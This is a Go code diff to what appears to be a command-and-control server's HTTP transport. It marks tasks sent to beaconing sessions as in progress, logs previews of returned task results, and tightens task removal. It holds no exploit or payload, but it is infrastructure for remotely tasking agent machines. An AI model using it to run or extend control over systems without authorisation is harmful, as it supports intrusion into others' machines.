@@ -297,6 +297,16 @@ func (ht *HTTPTransport) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	pendingTasks := ht.getPendingTasks(sessionID)
 	ht.logger.Debug("Returning %d pending tasks for session %s", len(pendingTasks), sessionID)
 	
+	// Mark tasks as in-progress to prevent re-sending
+	for _, taskMap := range pendingTasks {
+		if taskID, ok := taskMap["id"].(string); ok {
+			ht.logger.Debug("Marking task %s as in_progress for session %s", taskID, sessionID)
+			if ht.taskQueue != nil {
+				ht.taskQueue.UpdateStatus(taskID, "in_progress")
+			}
+		}
+	}
+	
 	response := map[string]interface{}{
 		"session_id": sessionID,
 		"tasks":      pendingTasks,
@@ -398,19 +408,34 @@ func (ht *HTTPTransport) handleResult(w http.ResponseWriter, r *http.Request) {
 	
 	taskType, _ := result["type"].(string)
 	taskID, _ := result["task_id"].(string)
+	resultValue, _ := result["result"].(string)
 	ht.logger.Debug("Received result for task %s (type: %s) from session %s", taskID, taskType, sessionID)
+	
+	// Log result content for debugging
+	if resultValue != "" {
+		resultPreview := resultValue
+		if len(resultPreview) > 200 {
+			resultPreview = resultPreview[:200] + "..."
+		}
+		ht.logger.Debug("Task result content: %s", resultPreview)
+	}
 	
 	// Update task status and remove after completion
 	if taskID != "" {
 		if ht.taskQueue != nil {
-			ht.taskQueue.SetResult(taskID, result)
-			ht.logger.Debug("Task %s result stored, scheduling removal", taskID)
-			// Remove task after a short delay to allow result processing
-			go func() {
-				time.Sleep(5 * time.Second)
-				ht.taskQueue.Remove(taskID)
-				ht.logger.Debug("Task %s removed after result processing", taskID)
-			}()
+			task := ht.taskQueue.Get(taskID)
+			if task != nil {
+				ht.taskQueue.SetResult(taskID, result)
+				ht.logger.Debug("Task %s result stored, scheduling removal", taskID)
+				// Remove task immediately after storing result
+				go func() {
+					time.Sleep(1 * time.Second) // Brief delay to allow result processing
+					ht.taskQueue.Remove(taskID)
+					ht.logger.Debug("Task %s removed after result processing", taskID)
+				}()
+			} else {
+				ht.logger.Debug("Task %s not found in queue (may have already been removed)", taskID)
+			}
 		}
 	}
 	
